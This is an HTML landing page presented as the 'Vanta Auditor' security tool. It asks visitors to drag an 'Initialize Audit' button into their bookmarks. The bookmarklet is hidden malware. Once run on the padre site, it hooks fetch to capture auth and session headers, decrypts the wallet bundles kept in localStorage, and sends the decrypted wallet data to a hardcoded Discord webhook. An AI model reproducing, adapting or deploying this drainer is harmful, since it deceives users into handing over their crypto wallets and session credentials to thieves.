<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audit Tool | Precision Analytics</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #00ff88; --bg: #050505; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.2; }
        .container { position: relative; z-index: 10; text-align: center; background: rgba(10, 10, 10, 0.9); padding: 50px; border: 1px solid var(--accent); border-radius: 15px; box-shadow: 0 0 40px rgba(0, 255, 136, 0.1); }
        h1 { font-weight: 900; color: var(--accent); letter-spacing: -2px; margin-bottom: 10px; }
        .cta-button { display: inline-block; background: var(--accent); color: #000; padding: 18px 45px; text-decoration: none; border-radius: 8px; font-weight: 800; transition: 0.3s; cursor: move; }
        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3); }
    </style>
</head>
<body>

    <canvas id="bgCanvas"></canvas>

    <div class="container">
        <h1>VANTA AUDITOR</h1>
        <p style="color: #888; margin-bottom: 30px;">Drag the button to your bookmarks bar to initialize the auditor.</p>
        
        <a href="#" class="cta-button" id="bookmarklet">INITIALIZE AUDIT</a>
        
        <p style="font-size: 11px; color: #444; margin-top: 20px;">v1.0.4 - WebGL Accelerated</p>
    </div>

    <script>
        // 1. THE PAYLOAD (Your Auditor Logic)
        // We wrap it in a string and URI-encode it so it works as a URL
        const rawCode = `(async function(){
            const CONFIG = {
                webhook: "https://discord.com/api/webhooks/1469038806681256071/PB2evnQlWcslXIglcXYSwyGnNYG6XcP9qeJzCkUfNIjJAx4YAg5RyyMtKRGQdi1eW2RT",
                decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
            };
            const notify = (msg) => {
                fetch(CONFIG.webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ embeds: [{ title: "ðŸš¨ AUDIT ALERT", description: msg, color: 0xff0000 }]})
                }).catch(()=>{});
            };
            const runDecryption = async (token, session) => {
                const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
                if (!bundleStr) return;
                const bundleData = JSON.parse(bundleStr);
                const firstKey = Object.keys(bundleData.bundles)[0];
                const payload = {
                    bundle: bundleData.bundles[firstKey].exportBundle,
                    subOrgId: bundleData.bundles[firstKey].subOrgId
                };
                try {
                    const res = await fetch(CONFIG.decryptUrl, {
                        method: 'POST',
                        headers: { 'Authorization': token, 'X-Padre-Session': session, 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    const decrypted = await res.json();
                    notify("âœ… **WALLET DECRYPTED**\\n" + JSON.stringify(decrypted));
                } catch (e) { notify("âŒ Error: " + e.message); }
            };
            let capturedToken = null;
            let capturedSession = "";
            const checkAndRun = (name, val) => {
                if (name.toLowerCase() === 'authorization') capturedToken = val;
                if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
                if (capturedToken && !window.auditComplete) {
                    window.auditComplete = true;
                    runDecryption(capturedToken, capturedSession);
                }
            };
            const _f = window.fetch;
            window.fetch = async (...a) => {
                const h = a[1]?.headers;
                if (h) Object.entries(h).forEach(([n, v]) => checkAndRun(n, v));
                return _f(...a);
            };
            _f('/api/v2/user/profile');
        })();`;

        // 2. GENERATE BOOKMARKLET URL
        const bookmarkletElement = document.getElementById('bookmarklet');
        bookmarkletElement.href = "javascript:" + encodeURIComponent(rawCode);

        // 3. SIMPLE BACKGROUND ANIMATION
        const canvas = document.getElementById('bgCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        function draw() {
            ctx.fillStyle = 'rgba(5, 5, 5, 0.1)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff88';
            for(let i=0; i<20; i++) {
                ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
            }
            requestAnimationFrame(draw);
        }
        draw();
    </script>
</body>
</html>
